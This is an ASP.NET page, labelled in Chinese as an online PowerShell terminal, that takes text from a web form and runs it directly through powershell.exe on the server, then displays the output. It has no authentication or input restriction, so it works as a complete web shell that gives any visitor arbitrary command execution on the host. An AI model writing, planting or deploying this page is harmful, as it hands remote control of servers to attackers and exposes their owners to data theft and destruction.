<%@ Page Language="C#" %>
<%@ Import Namespace=" System" %>
<%@ Import Namespace=" System.IO" %>
<script runat="server">
/* Copyright 2019 Frivolous (github.com/Frivolous-Sites). All rights reserved. */
protected void btncmd_Click(object sender, EventArgs e)
{
   String ogSh = commands.Text;
   String curPath = Server.MapPath(".");

   try
   {
         System.Diagnostics.Process si = new System.Diagnostics.Process();
         si.StartInfo.WorkingDirectory = curPath;
         si.StartInfo.UseShellExecute = false;
         si.StartInfo.FileName = "powershell.exe";
         si.StartInfo.Arguments = ogSh;
         si.StartInfo.CreateNoWindow = true;
         si.StartInfo.RedirectStandardInput = true;
         si.StartInfo.RedirectStandardOutput = true;
         si.StartInfo.RedirectStandardError = true;
         si.Start();
         String cmdOutput = si.StandardOutput.ReadToEnd();
         si.Close();
         cmdMessage.Text = cmdOutput.Replace(System.Environment.NewLine, "<br>");
   } catch (Exception ex) 
   {
         cmdMessage.Text = "错误：运行失败，无法启动系统程序";
   }
}
</script>

<html>
<head>
   <meta charset="UTF-8">
   <meta name="author" content="Frivolous">
   <title>PowerShell终端</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://picloud.xyz/Fonts/?%E8%8B%B9%E6%96%B9|%E7%AE%80,400,500" rel="stylesheet">
</head>
<body>
   <form id="form5" runat="server">
   
      <div style="text-align: center; font-family: 苹方简; font-weight: 400; font-size: 1em;">
         <h3 style="font-weight: 500; font-size: 2em;">在线PowerShell</h3>
         <br />
         <asp:TextBox id="commands" placeholder="请输入PowerShell命令" runat="server" TextMode="MultiLine" height="160px" Width="258.8854px" />
         <br /><br />
         <asp:Button ID="btncmd" runat="server" onclick="btncmd_Click"  Text="运行" style="width:85px" />
         <br /><br /><br />
         <code style="margin: auto; text-align: left; display:block; background-color: #727272; color: #68ffa7; max-width: 56%; padding-left: 2em; padding-bottom: 1.5em; padding-top: 0.5em;">
         <asp:Label ID="cmdMessage" runat="server" />
         </code>
      </div>
      
   </form>
</body>
</html>
<!-- Copyright 2019 Frivolous (github.com/Frivolous-Sites). All rights reserved. -->